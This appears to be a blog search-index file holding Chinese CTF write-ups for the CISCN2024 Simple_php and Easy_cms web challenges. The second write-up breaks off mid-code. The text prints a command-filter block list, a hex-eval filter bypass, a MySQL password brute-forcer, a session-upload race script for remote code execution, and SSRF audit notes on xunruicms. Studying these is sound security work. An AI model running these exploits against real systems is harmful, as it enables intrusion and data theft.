<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CISCN2024-WEB-Simple_php-WP</title>
      <link href="/post/76c5741f.html"/>
      <url>/post/76c5741f.html</url>
      
        <content type="html"><![CDATA[<h1 id="复现网站"><a href="#复现网站" class="headerlink" title="复现网站"></a>复现网站</h1><p><a href="https://ctf.show/challenges">https://ctf.show/challenges</a></p><h1 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h1><p>代码审计</p><p>16进制绕过<code>php</code>正则匹配<code>waf</code></p><p><code>LFI Session</code>文件包含</p><p><code>mysql</code>密码爆破</p><h1 id="实际流程"><a href="#实际流程" class="headerlink" title="实际流程"></a>实际流程</h1><p>第一步进行代码审计，发现过滤了超多东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的话，有两种思路</p><p>一种是正面突破绕过正则匹配</p><p>另一种则是曲线救国，避其锋芒</p><h2 id="正面突破"><a href="#正面突破" class="headerlink" title="正面突破"></a>正面突破</h2><p>可使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(A&lt;<span class="number">16</span>进制字符串&gt;,<span class="number">1</span>)));</span><br></pre></td></tr></table></figure><p>来进行绕过</p><ul><li>-r 是php的一个命令行选项，php -r 允许在不创建 php 文件的情况下执行 php 代码</li><li><code>substr(&lt;str&gt;,&lt;int&gt;)</code>表示从下标 int 开始截取 str 字符串的内容</li><li><code>hex2bin</code>即将16进制字符串转为2进制字符串形式</li><li>如果16进制字符串开头为数字的话，则类型会被识别为数字，所以使用substr截断</li></ul><p>尝试执行<code>phpinfo()</code>;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php -r <span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(A706870696e666f28293b,<span class="number">1</span>)));</span><br></pre></td></tr></table></figure><p><img src="/../post_img/29334d9f9bd493d9530b38f8b5f65425/ciscn2024_web_simplephp_1.png"></p><p>成功！</p><p>同样的，可以执行其他代码，但是经过测试，发现文件目录中并没有flag，phpinfo也在似乎也在提醒我们</p><p><img src="/../post_img/29334d9f9bd493d9530b38f8b5f65425/ciscn2024_web_simplephp_2.png"></p><p>但是发现存在mysql服务，推测flag存在于sql数据库中</p><p><img src="/../post_img/29334d9f9bd493d9530b38f8b5f65425/ciscn2024_web_simplephp_3.png"></p><p>尝试爆破数据库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;http://0f10e2bd-ad84-4c7f-a42c-8e54f509b1e0.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack</span>():  <span class="comment"># 爆破密码</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1400.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="built_in">dict</span> = fp.readlines()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> passwd <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        passwd = passwd.strip()</span><br><span class="line">        payload = <span class="string">b&quot;echo `mysql -u root -p&#x27;%s&#x27; -e &#x27;show databases;&#x27;`;&quot;</span> % passwd</span><br><span class="line"></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;cmd&quot;</span>: <span class="string">f&quot;php -r eval(hex2bin(substr(A<span class="subst">&#123;payload.<span class="built_in">hex</span>()&#125;</span>,1)));&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        text = requests.post(url,data=data).text</span><br><span class="line">        <span class="comment">#print(text)</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;尝试<span class="subst">&#123;passwd.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;mysql&quot;</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;sql密码为<span class="subst">&#123;passwd.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到&quot;</span>)</span><br></pre></td></tr></table></figure><p>找到数据库密码为root</p><p>首先读数据库，得到</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP<span class="emphasis">_CMS</span></span><br><span class="line"><span class="emphasis">information_schema</span></span><br><span class="line"><span class="emphasis">mysql</span></span><br><span class="line"><span class="emphasis">performance_</span>schema</span><br><span class="line">test</span><br></pre></td></tr></table></figure><p>前往PHP_CMS库下发现</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tables<span class="emphasis">_in_PHP_CMS</span></span><br><span class="line"><span class="emphasis">F1ag_</span>Se3Re7</span><br></pre></td></tr></table></figure><p>获取flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ctfshow</span>&#123;<span class="number">6745</span>e674-<span class="number">2743</span>-<span class="number">44</span>d0-<span class="number">8751</span>-<span class="number">3</span>f85100c398c&#125;</span><br></pre></td></tr></table></figure><p>以下是完整payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0f10e2bd-ad84-4c7f-a42c-8e54f509b1e0.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack</span>():  <span class="comment"># 爆破密码</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1400.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="built_in">dict</span> = fp.readlines()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> passwd <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        passwd = passwd.strip()</span><br><span class="line">        payload = <span class="string">b&quot;echo `mysql -u root -p&#x27;%s&#x27; -e &#x27;show databases;&#x27;`;&quot;</span> % passwd</span><br><span class="line"></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;cmd&quot;</span>: <span class="string">f&quot;php -r eval(hex2bin(substr(A<span class="subst">&#123;payload.<span class="built_in">hex</span>()&#125;</span>,1)));&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        text = requests.post(url,data=data).text</span><br><span class="line">        <span class="comment">#print(text)</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;尝试<span class="subst">&#123;passwd.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;mysql&quot;</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;sql密码为<span class="subst">&#123;passwd.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># crack()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;echo `mysql -u root -p&#x27;root&#x27; -e &#x27;show databases;use PHP_CMS;show tables;select * from F1ag_Se3Re7;&#x27;`;&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">        <span class="string">&quot;cmd&quot;</span>: <span class="string">f&quot;php -r eval(hex2bin(substr(A<span class="subst">&#123;payload.<span class="built_in">hex</span>()&#125;</span>,1)));&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">text = requests.post(url,data=data).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;ctfshow&#123;&quot;</span> <span class="keyword">in</span> text:</span><br><span class="line">    flag = re.search(<span class="string">r&#x27;ctfshow\&#123;.*?\&#125;&#x27;</span>, text).group()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\033[31mflag为<span class="subst">&#123;flag&#125;</span>\033[0m&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(text)</span><br><span class="line"><span class="built_in">print</span>(data[<span class="string">&quot;cmd&quot;</span>])</span><br></pre></td></tr></table></figure><h2 id="曲线救国"><a href="#曲线救国" class="headerlink" title="曲线救国"></a>曲线救国</h2><p>可利用session文件包含进行RCE</p><p>携带session的会话进行POST请求时，会在服务器某个目录下会产生sess_sessID的临时文件</p><p>一般路径为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/php/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/php/</span>sessions/sess_PHPSESSID</span><br><span class="line"><span class="regexp">/tmp/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/tmp/</span>sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure><p>本题的存放路径为&#x2F;tmp&#x2F;sess_PHPSESSID</p><p>这时，我们便可在sess_PHESESSID中包含木马</p><p>并通过cmd&#x3D;php &#x2F;tmp&#x2F;sess_PHPSESSID来执行代码，从而达成RCE</p><p>但需要注意的是sess_PHESESSID临时文件是会被系统清除掉的，因此我们需要竞争访问，赶在系统清除前访问它</p><p>总体思路差不多，以下是完整payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;abcd&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;php /tmp/sess_abcd&quot;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://0f10e2bd-ad84-4c7f-a42c-8e54f509b1e0.challenge.ctf.show/&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;select * from F1ag_Se3Re7;&#x27;`;echo &#x27;success!!!&#x27;; ?&gt;&quot;</span></span><br><span class="line">sign = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(url, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: payload&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;success!!!&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\033[32m<span class="subst">&#123;resp.text&#125;</span>\033[0m&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ctfshow&#123;&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\033[31mflag为<span class="subst">&#123;re.search(<span class="string">r&#x27;ctfshow&#123;.*?&#125;&#x27;</span>,resp.text)&#125;</span>\033[0m&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">        event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure><h2 id="此外"><a href="#此外" class="headerlink" title="此外"></a>此外</h2><p>看别的师傅还有反弹shell的方法，但是我自己没有成功反弹出来，或许是因为题目是docker容器环境下的原因吧</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[浅谈利用session绕过getshell - 蚁景网安实验室 - 博客园](<a href="https://www.cnblogs.com/hetianlab/p/14867521.html">浅谈利用session绕过getshell - 蚁景网安实验室 - 博客园 (cnblogs.com)</a>)</p><p>[国赛2024 simple_php(三种方法)](<a href="https://www.cnblogs.com/dghh/p/18204666">国赛2024 simple_php(三种方法) - DGhh - 博客园 (cnblogs.com)</a>)</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> CTF </tag>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2024-WEB-Easy_cms-WP</title>
      <link href="/post/1625270f.html"/>
      <url>/post/1625270f.html</url>
      
        <content type="html"><![CDATA[<h1 id="复现地址"><a href="#复现地址" class="headerlink" title="复现地址"></a>复现地址</h1><p><a href="https://ctf.show/challenges">https://ctf.show/challenges</a></p><h1 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h1><p>SSRF</p><p>反弹SHELL</p><p>代码审计</p><p>api调用</p><p>图片白名单绕过</p><h1 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h1><p>首先使用<code>dirsearch</code>进行信息搜集</p><p><img src="/./../post_img/f929178bed62f37812409241403e09ae/ciscn2024_web_easycms_1.png"></p><p>其中<code>/admin.php</code>，<code>/flag.php</code>，<code>/test.php</code>目录是有效的</p><p>尝试打<code>/admin.php</code>弱密码，失败，先搁置</p><p>访问<code>/test.php</code>目录可以获取网站相关基础信息</p><p><img src="/./../post_img/f929178bed62f37812409241403e09ae/ciscn2024_web_easycms_2.png" alt="ciscn2024_web_easycms_2"></p><p>得知CMS框架为迅睿CMS开源框架，版本为V4.6.2</p><p>结合提示，找到<a href="https://github.com/dayrui/xunruicms">源码</a>以及<a href="https://www.xunruicms.com/bug/">官方漏洞公示</a></p><p>题目中给到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> /flag.php： </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;</span>;</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>推测是<code>/flag.php</code>中存在<code>SSRF</code>漏洞</p><p><img src="/./../post_img/f929178bed62f37812409241403e09ae/ciscn2024_web_easycms_3.png"></p><p>找一下<code>qrcode</code></p><p><img src="/./../post_img/f929178bed62f37812409241403e09ae/ciscn2024_web_easycms_4.png"></p><p>发现在<code>/dayrui/Fcms/Control/Api/Api.php</code>中有这个函数定义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">qrcode</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$value</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;text&#x27;</span>));</span><br><span class="line">        <span class="variable">$thumb</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;thumb&#x27;</span>));</span><br><span class="line">        <span class="variable">$matrixPointSize</span> = (<span class="keyword">int</span>)<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;size&#x27;</span>);</span><br><span class="line">        <span class="variable">$errorCorrectionLevel</span> = <span class="title function_ invoke__">dr_safe_replace</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;level&#x27;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成二维码图片</span></span><br><span class="line">        <span class="keyword">require_once</span> CMSPATH.<span class="string">&#x27;Library/Phpqrcode.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$file</span> = WRITEPATH.<span class="string">&#x27;file/qrcode-&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>.<span class="variable">$thumb</span>.<span class="variable">$matrixPointSize</span>.<span class="variable">$errorCorrectionLevel</span>).<span class="string">&#x27;-qrcode.png&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!IS_DEV &amp;&amp; <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title class_">\QRcode</span>::<span class="title function_ invoke__">png</span>(<span class="variable">$value</span>, <span class="variable">$file</span>, <span class="variable">$errorCorrectionLevel</span>, <span class="variable">$matrixPointSize</span>, <span class="number">3</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&#x27;二维码生成失败&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$thumb</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$thumb</span>, <span class="string">&#x27;https://&#x27;</span>) !== <span class="literal">false</span></span><br><span class="line">                    &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$thumb</span>, <span class="string">&#x27;/&#x27;</span>) !== <span class="literal">false</span></span><br><span class="line">                    &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$thumb</span>, <span class="string">&#x27;http://&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="keyword">exit</span>(<span class="string">&#x27;图片地址不规范&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$img</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$thumb</span>);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$img</span>) &#123;</span><br><span class="line">                    <span class="keyword">exit</span>(<span class="string">&#x27;此图片不是一张可用的图片&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$code</span> = <span class="title function_ invoke__">dr_catcher_data</span>(<span class="variable">$thumb</span>);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$code</span>) &#123;</span><br><span class="line">                    <span class="keyword">exit</span>(<span class="string">&#x27;图片参数不规范&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$logo</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="variable">$code</span>); <span class="comment">//!!!!!!!!!!!!注意这行!!!!!!!!!!!!</span></span><br><span class="line">                <span class="variable">$QR_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$QR</span>);<span class="comment">//二维码图片宽度</span></span><br><span class="line">                <span class="variable">$logo_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$logo</span>);<span class="comment">//logo图片宽度</span></span><br><span class="line">                <span class="variable">$logo_height</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$logo</span>);<span class="comment">//logo图片高度</span></span><br><span class="line">                <span class="variable">$logo_qr_width</span> = <span class="variable">$QR_width</span> / <span class="number">4</span>;</span><br><span class="line">                <span class="variable">$scale</span> = <span class="variable">$logo_width</span>/<span class="variable">$logo_qr_width</span>;</span><br><span class="line">                <span class="variable">$logo_qr_height</span> = <span class="variable">$logo_height</span>/<span class="variable">$scale</span>;</span><br><span class="line">                <span class="variable">$from_width</span> = (<span class="variable">$QR_width</span> - <span class="variable">$logo_qr_width</span>) / <span class="number">2</span>;</span><br><span class="line">                <span class="comment">//重新组合图片并调整大小</span></span><br><span class="line">                <span class="title function_ invoke__">imagecopyresampled</span>(<span class="variable">$QR</span>, <span class="variable">$logo</span>, (<span class="keyword">int</span>)<span class="variable">$from_width</span>, (<span class="keyword">int</span>)<span class="variable">$from_width</span>, <span class="number">0</span>, <span class="number">0</span>, (<span class="keyword">int</span>)<span class="variable">$logo_qr_width</span>, (<span class="keyword">int</span>)<span class="variable">$logo_qr_height</span>, (<span class="keyword">int</span>)<span class="variable">$logo_width</span>, (<span class="keyword">int</span>)<span class="variable">$logo_height</span>);</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$QR</span>, <span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出图片</span></span><br><span class="line">        <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_clean</span>();</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: image/png&quot;</span>);</span><br><span class="line">        <span class="variable">$QR</span> &amp;&amp; <span class="title function_ invoke__">imagepng</span>(<span class="variable">$QR</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>注意到<code>$logo = imagecreatefromstring($code);</code>中的<code>imagecreatefromstring()</code>函数，且<code>$code</code>可控</p><p>又因为<code>$code = dr_catcher_data($thumb);</code>，转到<code>dr_catcher_data()</code>的定义</p><p>位于<code>/dayrui/Fcms/Core/Helper.php</code>中</p><figure class="highlight php"><table><tr><td 